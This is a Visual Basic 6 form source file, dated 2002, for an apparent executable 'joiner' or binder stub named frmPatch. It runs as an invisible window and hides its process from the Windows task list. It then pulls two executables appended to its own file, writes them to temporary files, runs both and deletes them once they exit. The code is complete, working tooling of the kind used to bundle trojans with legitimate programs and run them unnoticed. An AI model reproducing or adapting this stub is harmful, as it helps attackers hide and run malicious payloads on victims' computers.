VERSION 5.00
Begin VB.Form frmPatch 
   BorderStyle     =   0  'None
   ClientHeight    =   435
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   450
   Icon            =   "frmPatch.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   435
   ScaleWidth      =   450
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "frmPatch"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Copyright © 2002 By TSH
Option Explicit
Private Declare Function RegisterServiceProcess Lib "kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF

Private Declare Function GetTempFilename Lib "kernel32" Alias "GetTempFileNameA" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Private hProg1 As Long 'File1 process handle
Private idProg1 As Long 'File1 process ID
Private iExit1 As Long 'File1 exit code
Private hProg2 As Long 'File2 process handle
Private idProg2 As Long 'File2 process ID
Private iExit2 As Long 'File2 exit code

Const MySize As Integer = 16896 'Patch file original size
Private lenght As Long 'File1 & File2 file size
Private EXELen1 As Long 'File1  file size
Private EXELen2 As Long 'File2 file size
Dim sBuff As String * 32 'get the mark
Private pArray1() As Byte 'File1 bytes
Private pArray2() As Byte 'File2 bytes
Private vbArray() As Byte 'File1 & File2 bytes

Private Sub Form_Initialize()
On Error Resume Next
Dim File0, File1, File2 As String
  
    Call RegisterServiceProcess(0, 1) 'hide program in Ctrl+Alt+Del list
    Open cPath & App.EXEName & ".EXE" For Binary Access Read As #1
         lenght = LOF(1) - MySize
       If lenght <> 0 Then
          ReDim vbArray(lenght - 1)
          Get #1, MySize, vbArray 'get join file
          Get #1, LOF(1) - 31, sBuff 'get last 16 byte for check the File1 size.
          Close #1
        
       Call GetLength 'get length of File1 & File2
       
       'get temporary filename
       File0 = GetTemporaryFilename("EJN")
       File1 = GetTemporaryFilename("EJN")
       File2 = GetTemporaryFilename("EJN")
       
       'put File0, the 2 files
       Open File0 For Binary Access Write As #1
            Put #1, , vbArray
       Close #1
       
       'get File1 & File2 from File0
       Open File0 For Binary Access Read As #1
            ReDim pArray1(EXELen1 - 1)
            ReDim pArray2(EXELen2 - 1)
            Get #1, , pArray1
            Get #1, EXELen1 + 1, pArray2
       Close #1
       Do While Dir(File0, vbNormal) <> ""
          Kill File0
          DoEvents
       Loop
       
       'put File1
       Open File1 For Binary Access Write As #1
            Put #1, , pArray1
       Close #1
       
       'put File2
       Open File2 For Binary Access Write As #1
            Put #1, , pArray2
       Close #1
       
       'run File1 & File2
       idProg1 = Shell(File1, vbNormalFocus)
       idProg2 = Shell(File2, vbNormalFocus)
       
       'waiting File1 closing and delete it.
       hProg1 = OpenProcess(PROCESS_ALL_ACCESS, False, idProg1)
       GetExitCodeProcess hProg1, iExit1
       Do While iExit1 = STILL_ACTIVE
          DoEvents
          GetExitCodeProcess hProg1, iExit1
       Loop
       Do While Dir(File1, vbNormal) <> ""
          Kill File1
          DoEvents
       Loop
       
       'waiting File2 closing and delete it.
       hProg2 = OpenProcess(PROCESS_ALL_ACCESS, False, idProg2)
       GetExitCodeProcess hProg2, iExit2
       Do While iExit2 = STILL_ACTIVE
          DoEvents
          GetExitCodeProcess hProg2, iExit2
       Loop
       Do While Dir(File2, vbNormal) <> ""
          Kill File2
          DoEvents
       Loop
       
       Else
       Close #1
       End If 'lenght <> 0
       
End
End Sub

Private Function cPath() As String
If Right$(App.Path, 1) <> "\" Then
   cPath = App.Path & "\"
Else
   cPath = App.Path
End If
End Function

Private Sub GetLength()
Dim i As Integer
Dim s As String

For i = 1 To Len(sBuff) - 5
    s = Mid$(sBuff, i, 5)
    If s = "[LEN]" Then
       s = Right$(sBuff, Len(sBuff) - i)
       s = Right$(s, Len(s) - 4)
       EXELen1 = CLng(Mid$(s, 1, InStr(1, s, ",") - 1))
       EXELen2 = CLng(Mid$(s, InStr(1, s, ",") + 1, Len(s)))
       Exit For
    End If
Next i
End Sub

Private Function GetTemporaryFilename(Optional Prefix As String = "") As String
Dim lngReturnVal As Long
Dim strTempPath As String * 255
Dim strTempFilename As String * 255
    
    lngReturnVal = GetTempPath(255, strTempPath)
    lngReturnVal = GetTempFilename(strTempPath & "\", Prefix, 0, strTempFilename)
    
    GetTemporaryFilename = strTempFilename

End Function
